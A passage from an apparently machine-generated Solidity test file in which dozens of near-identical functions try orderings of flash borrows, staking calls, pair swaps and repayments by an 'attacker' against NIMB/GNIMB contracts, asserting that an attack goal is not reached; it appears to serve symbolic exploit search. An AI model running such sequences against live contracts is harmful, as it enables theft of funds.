        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand755(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand756(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand757(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand758(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand759(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand760(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand761(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand762(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand763(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand764(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand765(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand766(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand767(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand768(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand769(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand770(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_owner_gnimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand771(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand772(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand773(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand774(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand775(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand776(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_owner_gnimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand777(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand778(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand779(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand780(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand781(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand782(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand783(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand784(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand785(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand786(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand787(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand788(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand789(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand790(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_owner_gnimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand791(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand792(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand793(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand794(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand795(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_owner_gnimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand796(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand797(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand798(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand799(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand800(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand801(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand802(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand803(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand804(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand805(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand806(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand807(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_owner_gnimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand808(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand809(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
